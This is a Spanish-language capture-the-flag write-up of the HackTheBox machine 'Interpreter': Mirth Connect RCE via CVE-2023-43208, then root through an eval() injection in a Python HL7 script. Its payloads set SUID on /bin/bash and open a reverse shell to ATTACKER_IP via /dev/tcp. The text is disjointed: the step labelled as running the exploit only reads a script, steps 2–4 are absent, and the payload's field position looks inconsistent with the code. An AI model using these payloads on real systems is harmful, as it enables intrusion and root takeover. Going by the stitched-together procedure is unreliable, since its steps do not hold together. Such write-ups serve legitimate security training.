HackTheBox Linux Hard CVE-2023-43208

Máquina Interpreter

Máquina Linux centrada en la plataforma Mirth Connect 4.4.0 — un motor de integración HL7 usado en entornos de salud — vulnerable a CVE-2023-43208, una deserialización XStream que permite RCE sin autenticación. La escalada a root se logra a través de inyección en un script de procesamiento HL7 escrito en Python que usa eval() sobre mensajes controlados por el atacante.

Escenario

Interpreter simula un servidor de integración de datos clínicos usando Mirth Connect 4.4.0, una plataforma open-source de mensajería HL7 ampliamente usada en hospitales y clínicas. La versión instalada es vulnerable a CVE-2023-43208, una deserialización insegura de XStream que permite ejecución remota de código sin credenciales a través del endpoint de la API REST. Tras obtener shell como el usuario mirth, el atacante descubre credenciales de base de datos en el archivo de configuración, accede a MySQL, y finalmente explota una inyección de código en un script Python de procesamiento de mensajes HL7 que usa eval() de forma insegura para escalar a root.

Explotación — CVE-2023-43208

⚠️

CVE-2023-43208 — Mirth Connect XStream Deserialization RCE

Vulnerabilidad crítica en Mirth Connect < 4.4.1 que permite ejecución remota de código sin autenticación. La API REST acepta payloads XML en el endpoint /api/messages que son deserializados por XStream sin validación de tipo. Un atacante puede enviar un payload XStream malicioso que instancia clases Java arbitrarias al deserializarse, ejecutando comandos del sistema operativo como el usuario que corre el servicio (mirth).

Paso 1 — Preparar y ejecutar el exploit:

# Leer el script Python de procesamiento:
cat /opt/scripts/notif.py
#!/usr/bin/env python3
import sys
import subprocess

def process_hl7(message):
    # Extraer campo de tipo de mensaje HL7
    field = message.split('|')[8]
    # VULNERABLE: eval() sobre datos controlados por usuario
    result = eval(f"'{field}'.upper()")
    subprocess.run(['mail', '-s', f'HL7 {result}', 'admin@localhost'],
                   input=message.encode())

if __name__ == '__main__':
    process_hl7(sys.stdin.read())

Escalada de Privilegios — Python eval() Injection

El script notif.py es ejecutado por root (mediante un canal de Mirth Connect configurado como root o un cron job). El campo HL7 MSH.9 se pasa directamente a eval() sin sanitización, permitiendo inyección de código Python.

Paso 5 — Verificar permisos del script:

ls -la /opt/scripts/notif.py
# -rwxr-xr-x 1 root root ... /opt/scripts/notif.py

# Verificar si hay canal de Mirth que lo ejecute como root:
cat /opt/mirthconnect/conf/channels/*.xml | grep -i "script\|notif"
# → Canal "HL7_Notification" ejecuta /opt/scripts/notif.py como root

# Sudo check:
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/notif.py

Paso 6 — Crear payload HL7 malicioso con eval() injection:

# El campo MSH.9 se evalúa como Python, por lo que inyectamos:
# El formato HL7 es: MSH|^~\&|||||||||CAMPO_INYECTADO|||

# Payload para agregar SUID a bash:
HL7_PAYLOAD="MSH|^~\\&|||||||||'+__import__('os').system('chmod u+s /bin/bash')+'"

# Ejecutar el script como root via sudo:
echo "$HL7_PAYLOAD" | sudo /usr/bin/python3 /opt/scripts/notif.py

# Verificar:
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash  ← SUID bit activado

Alternativa — Reverse shell directa:

# Payload de reverse shell:
HL7_PAYLOAD="MSH|^~\\&|||||||||'+__import__('os').system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1\"')+'"

echo "$HL7_PAYLOAD" | sudo /usr/bin/python3 /opt/scripts/notif.py
